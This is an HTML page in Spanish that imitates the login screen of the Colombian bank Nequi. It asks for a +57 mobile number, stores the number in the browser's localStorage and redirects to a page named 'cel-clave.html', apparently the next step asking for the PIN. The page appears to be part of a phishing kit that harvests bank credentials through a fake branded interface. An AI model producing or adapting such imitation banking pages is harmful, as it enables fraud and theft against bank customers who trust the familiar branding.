<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ingreso</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>
  body {
    background: #200020;
  }
</style>
</head>

<body class="min-h-screen flex justify-center items-center text-white">

<section class="w-full max-w-[420px] min-h-screen flex flex-col p-4">

  <!-- HEADER -->
  <header class="w-full flex justify-between items-center">
    
    <!-- Icono ? -->
    <div class="w-6 h-6 border-2 border-white rounded-full flex justify-center items-center">
      <span class="text-white text-sm font-bold">?</span>
    </div>

    <!-- SVG -->
    <div class="flex justify-center items-center gap-1 text-gray-400">
      <!-- TU SVG COMPLETO -->
      <svg width="70px" height="24px" viewBox="0 0 118 40">
        <g fill="currentColor">
          <path d="M83.59,23.13..."></path>
          <path d="M41.83,33.79..."></path>
        </g>
      </svg>
    </div>

  </header>

  <!-- CONTENIDO -->
  <main class="flex-1 flex flex-col justify-center">

    <!-- LOGO -->
    <h1 class="text-5xl font-bold text-center mb-10">
      <span class="text-pink-500">■</span> Nequi
    </h1>

    <!-- FORM -->
    <form id="form" class="space-y-4">

      <!-- INPUT -->
      <div class="flex items-center bg-white/20 rounded p-2">
        
        <!-- +57 -->
        <div class="pr-3 border-r border-white text-pink-400 font-semibold">
          +57
        </div>

        <!-- Campo -->
        <input
          type="text"
          id="telefono"
          placeholder="Ingresa tu cel"
          class="w-full bg-transparent px-3 outline-none text-white placeholder:text-white"
        >
      </div>

      <!-- BOTÓN -->
      <button
        id="btn"
        class="w-full h-12 bg-pink-600 rounded text-white font-semibold opacity-50"
        disabled
      >
        Entra
      </button>

    </form>

  </main>

</section>

<script>
const input = document.getElementById("telefono");
const btn = document.getElementById("btn");
const form = document.getElementById("form");

/* FORMATO CELULAR */
function formatNumber(value) {
  let digits = value.replace(/\D/g, "").slice(0, 10);

  if (digits.length > 6) {
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (digits.length > 3) {
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

/* VALIDACIÓN */
function validar() {
  const digits = input.value.replace(/\D/g, "");
  return digits.length === 10 && digits.startsWith("3");
}

/* INPUT EVENT */
input.addEventListener("input", () => {
  input.value = formatNumber(input.value);

  if (validar()) {
    btn.disabled = false;
    btn.classList.remove("opacity-50");
  } else {
    btn.disabled = true;
    btn.classList.add("opacity-50");
  }
});

/* SUBMIT */
form.addEventListener("submit", (e) => {
  e.preventDefault();

  if (!validar()) return;

  const raw = input.value.replace(/\D/g, "");

  localStorage.setItem("numero", raw);

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
